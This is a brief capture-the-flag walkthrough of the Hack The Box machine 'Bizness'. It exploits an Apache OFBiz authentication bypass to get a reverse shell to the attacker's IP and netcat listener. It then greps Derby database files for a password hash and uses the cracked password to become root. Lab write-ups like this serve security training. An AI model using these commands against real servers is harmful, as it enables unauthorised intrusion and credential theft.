# Bizness -htb(Compi)

nmap:
	22, 80, 443

**Directory busting**:
	/accounting/control/login ---> login page (OFBiz) ----> google search leads to an authentication bypass exploit.

but to use the POC , we need to use java 11, my current java verson was 17.
Had to google how to change:
		
		sudo apt install openjdk-11-jdk  
		sudo update-alternatives --config java ---> then select java 11 from the options.


Then use the exploit written by Abdelhameed Ghazy.
	use the Lhost:Lport  option
	`python3 exploit.py https://bizness.htb/ shell 10.10.14.26:6666` to get a rev shell back to your : `nc -nvlp 6666`
Get USER.


Shell as Ofbiz ENUM:
--
linpeas:
	?? 
	no joy.

to get stable shell:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
Ctrl+Z  
stty raw -echo; fg
```



Derby is the database used:

using this in the directory (`/opt/ofbiz/runtime/data/derby/ofbiz/seg0`):
 `grep -arin -o -E '(\w+\W+){0,5}password(\W+\w+){0,5}' .`
 found the password hash:
	`$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`

Now i need to decrypt it :



password : `monkeybizness`

Change user to root and PWNED!
